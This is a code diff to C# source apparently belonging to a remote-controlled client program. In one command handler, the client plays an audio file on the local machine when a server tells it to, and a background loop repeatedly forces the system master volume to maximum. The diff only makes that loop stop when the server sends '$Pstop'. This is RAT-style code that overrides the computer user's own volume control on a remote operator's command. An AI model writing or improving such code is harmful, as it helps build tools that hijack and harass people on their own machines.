@@ -6,6 +6,7 @@ using System.Linq;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using VisioForge.Libs.NAudio.CoreAudioApi;
 
@@ -507,19 +508,12 @@ namespace ClientRecive.assets.Commands
             {
                 if (File.Exists(PlayPath))
                 {
+
                     var deviceEnumerator = new MMDeviceEnumerator();
                     var defaultRenderDevice = deviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
 
-                    _ = Task.Factory.StartNew(() =>
-                    {
-                        while (true)
-                        {
-                            if (defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar < 1.0f)
-                            {
-                                defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar = 1.0f;
-                            }
-                        }
-                    });
+                    CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
+                    CancellationToken cancellationToken = cancellationTokenSource.Token;
 
                     using (var audioFile = new AudioFileReader(PlayPath))
                     using (var outputDevice = new WaveOutEvent())
@@ -527,12 +521,23 @@ namespace ClientRecive.assets.Commands
                         outputDevice.Init(audioFile);
                         outputDevice.Play();
 
+                        _ = Task.Factory.StartNew(() =>
+                        {
+                            while (!cancellationToken.IsCancellationRequested)
+                            {
+                                if (defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar < 1.0f)
+                                {
+                                    defaultRenderDevice.AudioEndpointVolume.MasterVolumeLevelScalar = 1.0f;
+                                }
+                            }
+                        });
 
                         await Client.SendClientMessage(client, "$success");
 
                         if (Client.ReceiveMessageFromServer(client).Result is "$Pstop")
                         {
                             outputDevice.Stop();
+                            cancellationTokenSource.Cancel();
                             await Client.SendClientMessage(client, "$success");
                         }
                     }
